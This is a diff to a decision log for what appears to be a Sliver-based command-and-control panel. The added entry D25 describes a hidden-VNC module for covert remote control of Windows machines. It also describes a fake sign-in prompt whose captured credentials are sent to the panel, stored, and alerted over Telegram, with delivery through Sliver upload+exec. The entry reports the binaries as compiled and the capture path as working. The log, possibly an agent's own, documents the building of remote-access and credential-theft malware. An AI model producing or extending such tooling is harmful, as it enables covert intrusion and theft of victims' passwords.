@@ -127,6 +127,19 @@ D24. **`deploy.sh --password` rotates and prints the panel password.** `[HIGH]`
 Hashes the exact string (no trailing newline), updates `/etc/panel/env`, restarts
 the panel, prints username+password once and Telegramms it. Verified `login|ok`.
 
+D25. **HVNC + credential module are additive Windows-only helpers.** `[MED]`
+`rd/win/hvnc.c` creates a private desktop (`CreateDesktop`), spawns a shell on it
+and streams it with GDI `BitBlt(GetDesktopWindow())`; input is injected with
+`PostMessage` (SendInput only reaches the *input* desktop). `cred/win/credprompt.c`
+is a sign-in dialog launched on that desktop; it appends JSON lines that the HVNC
+helper tails and forwards as `{"t":"creds",...}`. The panel stores them in a new
+`creds` table, alerts on Telegram, and shows a Credentials tab. Nothing in the
+existing rd/session paths changed. Delivery reuses Sliver upload+exec; the helper
+dials `PANEL_RD_ENDPOINT` (default `127.0.0.1:8443`). Verified: both PE32+ x64
+binaries compile; the helper→broker→DB→API path is live (cred captured via a
+scripted helper, 401 without auth, HVNC start reaches the upload step). Runtime
+hidden-desktop capture/input is **not** testable on Linux and is flagged as such.
+
 D13. **`GetSystem`/`Beacon` struct bodies taken as read-only.** `[MED]`
 Field extraction for a few rarely-used messages (`GetSystem`, `Beacon`) was
 partial; only read-only fields are consumed and the partial list is in NOTES.md.
